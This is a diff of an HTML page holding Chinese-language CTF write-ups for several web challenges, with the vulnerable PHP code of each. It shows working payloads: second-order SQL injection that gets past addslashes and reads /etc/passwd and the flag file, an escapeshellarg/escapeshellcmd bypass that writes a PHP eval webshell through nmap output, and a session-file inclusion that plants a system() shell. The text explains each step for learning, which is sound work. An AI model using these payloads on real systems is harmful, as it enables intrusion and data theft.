./index.php&#34;);<br/>}<br/>?&gt;</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="php" cid="n135" mdtype="fences">&lt;?php<br>include &#34;mysql.php&#34;;<br>session_start();<br>if($_SESSION[&#39;login&#39;] != &#39;yes&#39;){<br>    header(&#34;Location: ./login.php&#34;);<br>    die();<br>}<br>if(isset($_GET[&#39;do&#39;])){<br>switch ($_GET[&#39;do&#39;])<br>{<br>case &#39;write&#39;:<br>    $category = addslashes($_POST[&#39;category&#39;]);<br>    $title = addslashes($_POST[&#39;title&#39;]);<br>    $content = addslashes($_POST[&#39;content&#39;]);<br>    $sql = &#34;insert into board<br>            set category = &#39;$category&#39;,<br>                title = &#39;$title&#39;,<br>                content = &#39;$content&#39;&#34;;<br>    $result = mysql_query($sql);<br>    header(&#34;Location: ./index.php&#34;);<br>    break;<br>case &#39;comment&#39;:<br>    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);<br>    $sql = &#34;select category from board where id=&#39;$bo_id&#39;&#34;;<br>    $result = mysql_query($sql);<br>    $num = mysql_num_rows($result);<br>    if($num&gt;0){<br>    $category = mysql_fetch_array($result)[&#39;category&#39;];<br>    $content = addslashes($_POST[&#39;content&#39;]);<br>    $sql = &#34;insert into comment<br>            set category = &#39;$category&#39;,<br>                content = &#39;$content&#39;,<br>                bo_id = &#39;$bo_id&#39;&#34;;<br>    $result = mysql_query($sql);<br>    }<br>    header(&#34;Location: ./comment.php?id=$bo_id&#34;);<br>    break;<br>default:<br>    header(&#34;Location: ./index.php&#34;);<br>}<br>}<br>else{<br>    header(&#34;Location: ./index.php&#34;);<br>}<br>?&gt;</pre>
 
 <p>字段都是直接拼接，但是使用了addslashes转义字段。查找一下绕过的方式</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n137" mdtype="fences">1：字符编码问题导致绕过<br/>1.1、设置数据库字符为gbk导致宽字节注入<br/>1.2、使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入<br/><br/>2：编码解码导致的绕过<br/>2.1、url解码导致绕过addslashes<br/>2.2、base64解码导致绕过addslashes<br/>2.3、json编码导致绕过addslashes<br/><br/>3：一些特殊情况导致的绕过<br/>3.1、没有使用引号保护字符串，直接无视addslashes<br/>3.2、使用了stripslashes<br/>3.3、字符替换导致的绕过addslashes</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n137" mdtype="fences">1：字符编码问题导致绕过<br>1.1、设置数据库字符为gbk导致宽字节注入<br>1.2、使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入<br><br>2：编码解码导致的绕过<br>2.1、url解码导致绕过addslashes<br>2.2、base64解码导致绕过addslashes<br>2.3、json编码导致绕过addslashes<br><br>3：一些特殊情况导致的绕过<br>3.1、没有使用引号保护字符串，直接无视addslashes<br>3.2、使用了stripslashes<br>3.3、字符替换导致的绕过addslashes</pre>
 
 <p>不过这个地方既没有编解码的函数也没有字符编码的设置，还使用了单引号闭合。理论上按照闭合那一套是不能注入的。但是现在有个问题是</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n139" mdtype="fences">$category = mysql_fetch_array($result)[&#39;category&#39;];</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n139" mdtype="fences">$category = mysql_fetch_array($result)[&#39;category&#39;];</pre>
 
 <p>如上获取数据的时候，没有使用转义函数，后续直接进行的拼接。addslashes函数转义保存到数据库的时候，反引号是不保存到数据库的，也就是<code>\&#39;</code>保存到数据库就变成了<code>’</code>单引号。</p>
 <p>也就是需要我们在发帖的时候保存category字段一个注入的代码，在留言评论的时候来触发他。</p>
 <p>先来构造一下SQL语句，既然是insert注入，那就用盲注，构造如下语句。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n143" mdtype="fences">insert into comment<br/>            set category = &#39;111&#39; and if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),0),#&#39;,<br/>                content = &#39;$content&#39;,<br/>                bo_id = &#39;$bo_id&#39;</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n143" mdtype="fences">insert into comment<br>            set category = &#39;111&#39; and if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),0),#&#39;,<br>                content = &#39;$content&#39;,<br>                bo_id = &#39;$bo_id&#39;</pre>
 
 <p>先来发个帖子，咱来评论留言，发现SQL被执行。</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211009172411010.png" alt="image-20211009172411010"></p>
 <p>既然user是r开头的，那估计也就是root@localhost了，查库表。本来写个脚本执行，但是发现总是请求过多，响应超时。</p>
 <p>搞了半天总是报错，就看看能不能报错回显出来，本地测试一个报错回显的语句，这样写能成功，但是需要出单引号，上面的语句只能闭合不能出去。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n148" mdtype="fences">insert into users<br/>set id = 55,<br/>username = updatexml(1,concat(0x7e,(version())),0),<br/>password = &#39;11111&#39;;</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n148" mdtype="fences">insert into users<br>set id = 55,<br>username = updatexml(1,concat(0x7e,(version())),0),<br>password = &#39;11111&#39;;</pre>
 
 <p>这是个多行的SQL语句，可以使用多行注释来拼接，然后再写一个参数进去，类似如下：</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n150" mdtype="fences">insert into comment<br/>            set category = &#39;111&#39;,/*&#39;,<br/>                content = &#39;*/ content=updatexml(1,concat(0x7e,(version())),0),#&#39;,<br/>                bo_id = &#39;$bo_id&#39;</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n150" mdtype="fences">insert into comment<br>            set category = &#39;111&#39;,/*&#39;,<br>                content = &#39;*/ content=updatexml(1,concat(0x7e,(version())),0),#&#39;,<br>                bo_id = &#39;$bo_id&#39;</pre>
 
 <p>试了半天也没结果，然后才想起来这报错不会被写进去，直接报错去了。。。</p>
 <p>既然能写进去，那就直接执行，不需要报错语句，测试以下语句。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n153" mdtype="fences">insert into comment<br/>            set category = &#39;111&#39;,/*&#39;,<br/>                content = &#39;*/ content=version(),#&#39;,<br/>                bo_id = &#39;$bo_id&#39;</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n153" mdtype="fences">insert into comment<br>            set category = &#39;111&#39;,/*&#39;,<br>                content = &#39;*/ content=version(),#&#39;,<br>                bo_id = &#39;$bo_id&#39;</pre>
 
 <p>回显如下</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211015145908789.png" alt="image-20211015145908789"></p>
 <p>想了一圈子发现还是最简单的方式能直接使用。查库名为ctf。如下查询表的时候注意要括号包裹不然会报错。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n157" mdtype="fences">insert into comment<br/>            set category = &#39;111&#39;,/*&#39;,<br/>                content = &#39;*/ content=(select group_concat(table_name) from information_schema.tables where table_schema=database()),#&#39;,<br/>                bo_id = &#39;$bo_id&#39;</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n157" mdtype="fences">insert into comment<br>            set category = &#39;111&#39;,/*&#39;,<br>                content = &#39;*/ content=(select group_concat(table_name) from information_schema.tables where table_schema=database()),#&#39;,<br>                bo_id = &#39;$bo_id&#39;</pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211015152847893.png" alt="image-20211015152847893"></p>
 <p>查询字段名，主要表名要十六进制形式，查询user表。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n160" mdtype="fences">content=*/+content=(select+group_concat(COLUMN_NAME)+from+information_schema.COLUMNS+where+table_schema=database()+and+TABLE_NAME=0x75736572),#&amp;bo_id=1</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n160" mdtype="fences">content=*/+content=(select+group_concat(COLUMN_NAME)+from+information_schema.COLUMNS+where+table_schema=database()+and+TABLE_NAME=0x75736572),#&amp;bo_id=1</pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211015163102290.png" alt="image-20211015163102290"></p>
 <p>查字段信息，就一个zhangwei。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n163" mdtype="fences">content=*/+content=(select+group_concat(username)+from+ctf.user),#&amp;bo_id=1</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n163" mdtype="fences">content=*/+content=(select+group_concat(username)+from+ctf.user),#&amp;bo_id=1</pre>
 
 <p>换一个表查，board表。hex值为0x626f617264。字段有：id,category,title,content</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n165" mdtype="fences">content=*/+content=(select+group_concat(COLUMN_NAME)+from+information_schema.COLUMNS+where+table_schema=database()+and+TABLE_NAME=0x626f617264),#&amp;bo_id=1</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n165" mdtype="fences">content=*/+content=(select+group_concat(COLUMN_NAME)+from+information_schema.COLUMNS+where+table_schema=database()+and+TABLE_NAME=0x626f617264),#&amp;bo_id=1</pre>
 
 <p>这几个字段查了一遍还是没有信息，表comment也没有信息，这就有意思了。不在数据库里，SQL还能干啥，毕竟是root权限，试试能不能写文件。</p>
 <p>试了一番发现并不能愉快的写文件，或者目录是特定目录。文件不给写试试能不能读。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n168" mdtype="fences">content=*/+content=(SELECT+LOAD_FILE(0x2f6574632f706173737764)),#&amp;bo_id=2</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n168" mdtype="fences">content=*/+content=(SELECT+LOAD_FILE(0x2f6574632f706173737764)),#&amp;bo_id=2</pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211015173416010.png" alt="image-20211015173416010"></p>
 <p>好家伙 又是一个花式文件读取。直接读取根目录下的flag文件</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n171" mdtype="fences">content=11*/+content=(SELECT+LOAD_FILE(0x2f666c6167)),#&amp;bo_id=3</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n171" mdtype="fences">content=11*/+content=(SELECT+LOAD_FILE(0x2f666c6167)),#&amp;bo_id=3</pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018101945665.png" alt="image-20211018101945665"></p>
 <h2 id="asis-2019-unicorn-shop"><a href="#asis-2019-unicorn-shop" class="headerlink" title="asis_2019_unicorn_shop"></a>asis_2019_unicorn_shop</h2><p>访问首页是一个购买网页，需要购买独角兽。但是我们没有钱，明显买不了。随便输入一个数</p>
@@ -391,28 +391,28 @@ if(isset($_GET[&#39;ip&#39;]))&#123;
 <p>选择如下的符号：<a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/U+10123">https://www.compart.com/en/unicode/U+10123</a></p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018114617271.png" alt="image-20211018114617271"></p>
 <p>不过这个flag应该是有问题的，并不能验证成功。</p>
-<h2 id="buuctf-2018-online-tool"><a href="#buuctf-2018-online-tool" class="headerlink" title="buuctf_2018_online_tool"></a>buuctf_2018_online_tool</h2><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="php" cid="n182" mdtype="fences">&lt;?php<br/><br/>if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {<br/>    $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];<br/>}<br/><br/>if(!isset($_GET[&#39;host&#39;])) {<br/>    highlight_file(__FILE__);<br/>} else {<br/>    $host = $_GET[&#39;host&#39;];<br/>    $host = escapeshellarg($host);<br/>    $host = escapeshellcmd($host);<br/>    $sandbox = md5(&#34;glzjin&#34;. $_SERVER[&#39;REMOTE_ADDR&#39;]);<br/>    echo &#39;you are in sandbox &#39;.$sandbox;<br/>    @mkdir($sandbox);<br/>    chdir($sandbox);<br/>    echo system(&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;.$host);<br/>}</pre>
+<h2 id="buuctf-2018-online-tool"><a href="#buuctf-2018-online-tool" class="headerlink" title="buuctf_2018_online_tool"></a>buuctf_2018_online_tool</h2><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="php" cid="n182" mdtype="fences">&lt;?php<br><br>if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {<br>    $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];<br>}<br><br>if(!isset($_GET[&#39;host&#39;])) {<br>    highlight_file(__FILE__);<br>} else {<br>    $host = $_GET[&#39;host&#39;];<br>    $host = escapeshellarg($host);<br>    $host = escapeshellcmd($host);<br>    $sandbox = md5(&#34;glzjin&#34;. $_SERVER[&#39;REMOTE_ADDR&#39;]);<br>    echo &#39;you are in sandbox &#39;.$sandbox;<br>    @mkdir($sandbox);<br>    chdir($sandbox);<br>    echo system(&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;.$host);<br>}</pre>
 
 <p>打开首页，又是一段代码，其中涉及两个函数escapeshellarg和escapeshellcmd，这是个防止命令执行的函数，区别在于</p>
 <p>escapeshellarg：转义其中的单引号，并用单引号来包裹字符串。保证输入为一个字符串。</p>
 <p>escapeshellcmd：转义可能导致命令执行的特殊符号，常见的特殊符号包括换行符都被会转义，单双引号在不配对的时候也被转义。保证输入为避免利用shell的特性执行其他命令。</p>
 <p>本身正常情况下，都能起到防止命令注入，但是如果在一起使用，就会导致异常转义，因为escapeshellcmd也转义反斜线。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n187" mdtype="fences">127.0.0.1&#39; id<br/>escapeshellarg: &#39;127.0.0.1&#39;\&#39;&#39; id&#39;<br/>escapeshellcmd: 127.0.0.1\&#39; id</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n187" mdtype="fences">127.0.0.1&#39; id<br>escapeshellarg: &#39;127.0.0.1&#39;\&#39;&#39; id&#39;<br>escapeshellcmd: 127.0.0.1\&#39; id</pre>
 
 <p>在一起使用就会变成</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n189" mdtype="fences">escapeshellarg+escapeshellcmd: &#39;127.0.0.1&#39;\\&#39;&#39; id\&#39;</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n189" mdtype="fences">escapeshellarg+escapeshellcmd: &#39;127.0.0.1&#39;\\&#39;&#39; id\&#39;</pre>
 
 <p>简化上面的输入就是，第一个单引号已经被转义，后面的单引号也是，所以此处只当作字符来处理。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n191" mdtype="fences">127.0.0.1\ id&#39;</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n191" mdtype="fences">127.0.0.1\ id&#39;</pre>
 
 <p>但以上的命令并不能被执行，问题在于利用shell特性的分割连接符等都被转义了。以上解决的只是把一个字符串的输入分割成了携带参数形式的输入。</p>
 <p>后面需要利用nmap，既然是能分割成携带参数选项的输入，那需要配合nmap的参数来执行。记得在nmap的一个低版本存在一个提权问题，不过由于是交互界面。也不能使用shell的命令符号，需要查找一个nmap能执行使用的参数。</p>
 <p>首页代码中使用IP创建一个sandbox的目录，按照惯性，应该是为了写文件而准备的，所以应该是利用nmap的输出属性来执行。nmap输出参数有<code>-oN/-oX/-oS/-oG/-oA</code>。</p>
 <p>首先需要调试一个能正常逃逸出单引号的payload，可以在<a target="_blank" rel="noopener" href="https://tool.lu/coderunner">https://tool.lu/coderunner</a>测试，首先需要逃逸出双引号的两端包裹，先在两端添加两个单引号，输出为：</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n196" mdtype="fences">&#39;&#39;\\&#39;&#39;\&lt;\?php @eval\(\$_POST\[123\]\)\;\?\&gt; -o index.php&#39;\\&#39;&#39;&#39;<br/>简化为：\&lt;?php @eval($_POST[123]);?&gt; -o index.php\\</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n196" mdtype="fences">&#39;&#39;\\&#39;&#39;\&lt;\?php @eval\(\$_POST\[123\]\)\;\?\&gt; -o index.php&#39;\\&#39;&#39;&#39;<br>简化为：\&lt;?php @eval($_POST[123]);?&gt; -o index.php\\</pre>
 
 <p>再需要分割开两端的反斜线，两端添加两个空格。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n198" mdtype="fences">&#39; &lt;?php @eval($_POST[123]);?&gt; -o index.php &#39;<br/>输出为：&#39;&#39;\\&#39;&#39; \&lt;\?php @eval\(\$_POST\[123\]\)\;\?\&gt; -o index.php &#39;\\&#39;&#39;&#39;</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n198" mdtype="fences">&#39; &lt;?php @eval($_POST[123]);?&gt; -o index.php &#39;<br>输出为：&#39;&#39;\\&#39;&#39; \&lt;\?php @eval\(\$_POST\[123\]\)\;\?\&gt; -o index.php &#39;\\&#39;&#39;&#39;</pre>
 
 <p>于是大概能用的payload就出来了，先测试一下哪个参数可以使用，一个个试一下，发现oG可以使用。</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018151828426.png" alt="image-20211018151828426"></p>
@@ -420,32 +420,32 @@ if(isset($_GET[&#39;ip&#39;]))&#123;
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018151945869.png" alt="image-20211018151945869"></p>
 <p>哎嘿，这个flag又报错，看来0Solves的多少有点问题。</p>
 <h2 id="Bestphp"><a href="#Bestphp" class="headerlink" title="Bestphp"></a>Bestphp</h2><p>首页又是一段PHP</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n206" mdtype="fences">&lt;?php<br/>    highlight_file(__FILE__);<br/>    error_reporting(0);<br/>    ini_set(&#39;open_basedir&#39;, &#39;/var/www/html:/tmp&#39;);<br/>    $file = &#39;function.php&#39;;<br/>    $func = isset($_GET[&#39;function&#39;])?$_GET[&#39;function&#39;]:&#39;filters&#39;; <br/>    call_user_func($func,$_GET);<br/>    include($file);<br/>    session_start();<br/>    $_SESSION[&#39;name&#39;] = $_POST[&#39;name&#39;];<br/>    if($_SESSION[&#39;name&#39;]==&#39;admin&#39;){<br/>        header(&#39;location:admin.php&#39;);<br/>    }<br/>?&gt;</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n206" mdtype="fences">&lt;?php<br>    highlight_file(__FILE__);<br>    error_reporting(0);<br>    ini_set(&#39;open_basedir&#39;, &#39;/var/www/html:/tmp&#39;);<br>    $file = &#39;function.php&#39;;<br>    $func = isset($_GET[&#39;function&#39;])?$_GET[&#39;function&#39;]:&#39;filters&#39;; <br>    call_user_func($func,$_GET);<br>    include($file);<br>    session_start();<br>    $_SESSION[&#39;name&#39;] = $_POST[&#39;name&#39;];<br>    if($_SESSION[&#39;name&#39;]==&#39;admin&#39;){<br>        header(&#39;location:admin.php&#39;);<br>    }<br>?&gt;</pre>
 
 <p>由于存在call_user_func，所以我们可以覆盖file参数，来达到包含我们想要的文件，如果直接读取flag的话，下面的内容就有点多余，所以这里大概需要读取function和admin文件来查看。不能直接包含，不然PHP代码看不到。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n208" mdtype="fences">/?function=extract&amp;file=php://filter/convert.base64-encode/resource=./function.php</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n208" mdtype="fences">/?function=extract&amp;file=php://filter/convert.base64-encode/resource=./function.php</pre>
 
 <p>function内容为如下，看起来是个黑名单过滤。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n210" mdtype="fences">&lt;?php<br/>function filters($data){<br/>    foreach($data as $key=&gt;$value){<br/>        if(preg_match(&#39;/eval|assert|exec|passthru|glob|system|popen/i&#39;,$value)){<br/>            die(&#39;Do not hack me!&#39;);<br/>        }<br/>    }<br/>}<br/>?&gt;</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n210" mdtype="fences">&lt;?php<br>function filters($data){<br>    foreach($data as $key=&gt;$value){<br>        if(preg_match(&#39;/eval|assert|exec|passthru|glob|system|popen/i&#39;,$value)){<br>            die(&#39;Do not hack me!&#39;);<br>        }<br>    }<br>}<br>?&gt;</pre>
 
 <p>admin文件为</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n212" mdtype="fences">&lt;?php<br/>if(empty($_SESSION[&#39;name&#39;])){<br/>    session_start();<br/>    #echo &#39;hello &#39; + $_SESSION[&#39;name&#39;];<br/>}else{<br/>    die(&#39;you must login with admin&#39;);<br/>}<br/>Pz4</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n212" mdtype="fences">&lt;?php<br>if(empty($_SESSION[&#39;name&#39;])){<br>    session_start();<br>    #echo &#39;hello &#39; + $_SESSION[&#39;name&#39;];<br>}else{<br>    die(&#39;you must login with admin&#39;);<br>}<br>Pz4</pre>
 
 <p>看起来没有直接利用的函数，但是这个创建了session，也就是有session文件的写入，我们需要去读取session文件来包含。</p>
 <p>session的name在首页的POST中传输，再去访问admin文件，这里只判断参数是不是空。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n215" mdtype="fences">/?function=extract&amp;file=php://filter/convert.base64-encode/resource=/tmp/sess_k8ud00tfqs2mevh289uukn5to5</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n215" mdtype="fences">/?function=extract&amp;file=php://filter/convert.base64-encode/resource=/tmp/sess_k8ud00tfqs2mevh289uukn5to5</pre>
 
-<p>加载发现，并没有回显，也许不在这个目录，在/var/lib下。</p>
+<p>加载发现，并没有回显，也许不在这个目录，在&#x2F;var&#x2F;lib下。</p>
 <p>但是这里有一个问题，由于open_basedir的存在，我们不能加载别的目录下的文件，只能加载当前目录和tmp目录。</p>
 <p>session_start函数有一个参数为save_path，可以设置保存路径，注意此处随便写入一个session的文件名，不然在POST获取的时候，就已经创建null。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n219" mdtype="fences">POST /?function=session_start&amp;save_path=/tmp HTTP/1.1<br/>Host: www.bmzclub.cn:22937<br/>DNT: 1<br/>Upgrade-Insecure-Requests: 1<br/>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br/>Accept-Encoding: gzip, deflate<br/>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br/>Cookie: PHPSESSID=123<br/>Connection: close<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 23<br/><br/>name=&lt;?php phpinfo();?&gt;</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n219" mdtype="fences">POST /?function=session_start&amp;save_path=/tmp HTTP/1.1<br>Host: www.bmzclub.cn:22937<br>DNT: 1<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br>Cookie: PHPSESSID=123<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 23<br><br>name=&lt;?php phpinfo();?&gt;</pre>
 
 <p>获取session</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n221" mdtype="fences">/?function=extract&amp;file=/tmp/sess_123</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n221" mdtype="fences">/?function=extract&amp;file=/tmp/sess_123</pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018172443260.png" alt="image-20211018172443260"></p>
 <p>写入一个shell</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n224" mdtype="fences">name=&lt;?php system($_GET[&#34;aaa&#34;]);?&gt;</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n224" mdtype="fences">name=&lt;?php system($_GET[&#34;aaa&#34;]);?&gt;</pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018172740231.png" alt="image-20211018172740231"></p>
 
